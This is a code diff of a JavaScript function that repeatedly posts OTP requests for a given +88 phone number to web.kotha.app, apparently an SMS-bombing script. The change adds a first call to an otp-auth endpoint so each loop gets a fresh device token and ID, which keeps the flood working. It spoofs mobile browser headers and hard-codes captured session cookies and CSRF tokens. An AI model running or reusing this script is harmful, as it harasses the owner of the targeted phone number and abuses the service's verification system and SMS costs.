@@ -6,13 +6,11 @@ async function kotha(number, limit) {
 
     for (let i = 0; i < 15; i++) {
       try {
-        const response = await axios.post(
-  'https://web.kotha.app/api/otp',
+        const { data } = await axios.post(
+  'https://web.kotha.app/api/otp-auth',
   {
     'number': `+88${number}`,
-    'retryAttempt': 0,
-    'deviceToken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VJZCI6IjM0NTZjYjhmLTIzM2QtNGI3MS04MWM1LTU4NGViZWM0MmZjYiIsImlhdCI6MTc1MDc2MDg4MiwiZXhwIjoxNzUwNzYxNzgyfQ.SR8qeUKurzMXExCVFmmi30k9N7kTzjhwJdT6fJy226A',
-    'deviceId': '3456cb8f-233d-4b71-81c5-584ebec42fcb'
+    'retryAttempt': 0
   },
   {
     headers: {
@@ -20,7 +18,7 @@ async function kotha(number, limit) {
       'accept': '*/*',
       'accept-language': 'en-US,en;q=0.9',
       'content-type': 'application/json',
-      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga_5Q0583973Z=GS2.1.s1750760835$o1$g0$t1750760835$j60$l0$h0; _ga=GA1.1.875733277.1750760835; AWSALBCORS=at9Yexi+0tm4dMhQXTkqlC8oQcqU/IIO1NbWHCQ2jofPwkNgsMtDzDe/uu7eH9XljqoA6fp9/6gECo8zvpEaUxqG9ZEac9ZvPXSRHtO5OuL96skde2iuaD5nj0tS; __Host-next-auth.csrf-token=e7b0b30e83c0d5cd60d40370fb618c9caa55601df14690b33479a769df805f9f%7C1079da5c29bf344f80588dbf4826cb6bac8093cb721d13c01ed90a45eb927da7; _gcl_au=1.1.1095184874.1750760848; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750760847$o1$g1$t1750760881$j26$l0$h712145416; AWSALB=YaizmUAC7bj3Qw6D5RIQgITqYJxJT8RRjxY8LM2oAMYOkSC+KMm5dI6CemDvoVkNSZJRryzsOgIAPvIorKCsDy3fXL2aZaQsfAWv791wgcWse2vW9fp3To6511+K',
+      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga=GA1.1.875733277.1750760835; _gcl_au=1.1.1095184874.1750760848; AWSALBCORS=BnWk0XjLjLl+1kKWqjAQHKom4dOTJkTpW0WnQJKP2Qt74cnA90WG/Vo+20UKyVqTlRNr4fGg3unp4wixSpU1mDQZvHXXVDNVYa8WYcMUoRKxSE3U8Y/H18pvjIHQ; _ga_5Q0583973Z=GS2.1.s1750835786$o2$g0$t1750835786$j60$l0$h0; __Host-next-auth.csrf-token=e94359f9a5dc1bb1b4b41f16576244267238e534a89d94c95bb14b294fd286de%7Cc841a6f2ee0f9fa959f1c022352d34889b70879772b34de0151c3f52526c6d6f; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750835791$o2$g0$t1750835797$j54$l0$h1480993924; AWSALB=OIz0dKK0Nf+nLiXwnuMto8X9h6yqeKqFwyTZmWhjD6TDIB1+HIqNiA27Q1zDxzhmtfxf4sNedd5cp8jqTjolXTB72eV0U1z7sCVDmvwBjEXrxqp0p68dMNZj229u',
       'origin': 'https://web.kotha.app',
       'referer': 'https://web.kotha.app/',
       'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
@@ -34,6 +32,33 @@ async function kotha(number, limit) {
   }
 );
 
+const response = await axios.post(
+  'https://web.kotha.app/api/otp',
+  {
+    'number': `+88${number}`,
+    'retryAttempt': 0,
+    'deviceToken': data.deviceToken,
+    'deviceId': data.deviceId
+  },
+  {
+    headers: {
+      'authority': 'web.kotha.app',
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9',
+      'content-type': 'application/json',
+      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga=GA1.1.875733277.1750760835; _gcl_au=1.1.1095184874.1750760848; AWSALBCORS=BnWk0XjLjLl+1kKWqjAQHKom4dOTJkTpW0WnQJKP2Qt74cnA90WG/Vo+20UKyVqTlRNr4fGg3unp4wixSpU1mDQZvHXXVDNVYa8WYcMUoRKxSE3U8Y/H18pvjIHQ; _ga_5Q0583973Z=GS2.1.s1750835786$o2$g0$t1750835786$j60$l0$h0; __Host-next-auth.csrf-token=e94359f9a5dc1bb1b4b41f16576244267238e534a89d94c95bb14b294fd286de%7Cc841a6f2ee0f9fa959f1c022352d34889b70879772b34de0151c3f52526c6d6f; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750835791$o2$g1$t1750836037$j45$l0$h1480993924; AWSALB=fHL0s0SzRT7JKJbmRt4TLBSeYWh+SUpLPqm3zuu1GQTkoFAlIp70F7sSgCyk9J1yxWEegtYfUSe0LSmQDWmr8SXRL27GVKFiuKeCfaA9MFo4uyhIAIAwLKOmhUEU',
+      'origin': 'https://web.kotha.app',
+      'referer': 'https://web.kotha.app/',
+      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+      'sec-ch-ua-mobile': '?1',
+      'sec-ch-ua-platform': '"Android"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-origin',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    }
+  }
+);
         console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
       } catch (error) {
         console.error(`[${i + 1}/10] Failed:`, error.message);
